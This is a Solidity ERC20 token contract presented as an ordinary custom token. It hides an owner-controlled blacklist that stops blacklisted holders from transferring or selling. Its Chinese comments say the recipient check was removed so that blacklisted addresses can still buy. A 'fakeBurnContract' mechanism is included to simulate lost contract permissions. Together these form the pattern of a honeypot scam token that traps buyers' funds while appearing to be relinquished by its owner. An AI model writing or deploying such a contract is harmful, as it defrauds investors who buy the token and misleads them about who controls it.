// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CustomERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public isBlacklisted;
    address public fakeBurnContract; // 地址用于模拟丢失合约权限

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event AddedToBlacklist(address indexed account);
    event RemovedFromBlacklist(address indexed account);
    event FakeBurnContractUpdated(address indexed previousContract, address indexed newContract);

    constructor(
        string memory _name,
        string memory _symbol,
        uint8 _decimals,
        uint256 _initialSupply
    ) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _initialSupply * 10**uint256(_decimals);
        balanceOf[msg.sender] = totalSupply;
    }

    function addToBlacklist(address account) public {
        require(msg.sender == address(this) || msg.sender == owner, "Only owner or contract can add to blacklist");
        require(account != address(0), "Invalid address");
        isBlacklisted[account] = true;
        emit AddedToBlacklist(account);
    }

    function removeFromBlacklist(address account) public {
        require(msg.sender == address(this) || msg.sender == owner, "Only owner or contract can remove from blacklist");
        require(account != address(0), "Invalid address");
        isBlacklisted[account] = false;
        emit RemovedFromBlacklist(account);
    }

    function setFakeBurnContract(address _contract) public onlyOwner {
        emit FakeBurnContractUpdated(fakeBurnContract, _contract);
        fakeBurnContract = _contract;
    }

    function transfer(address to, uint256 value) public returns (bool) {
        require(!isBlacklisted[msg.sender], "Sender is blacklisted");
        require(to != address(0), "Invalid address");
        require(balanceOf[msg.sender] >= value, "Insufficient balance");
        
        // 移除以下检查以允许黑名单地址购买代币
        // require(!isBlacklisted[to], "Recipient is blacklisted");
        
        // 添加以下检查以模拟丢失合约权限
        require(msg.sender != fakeBurnContract, "Sender has fake burn contract permission");

        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        require(!isBlacklisted[from], "Sender is blacklisted");
        require(to != address(0), "Invalid address");
        require(balanceOf[from] >= value, "Insufficient balance");
        require(allowance[from][msg.sender] >= value, "Allowance exceeded");
        
        // 添加以下检查以模拟丢失合约权限
        require(from != fakeBurnContract, "Sender has fake burn contract permission");

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }

    address public owner = msg.sender;

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }
}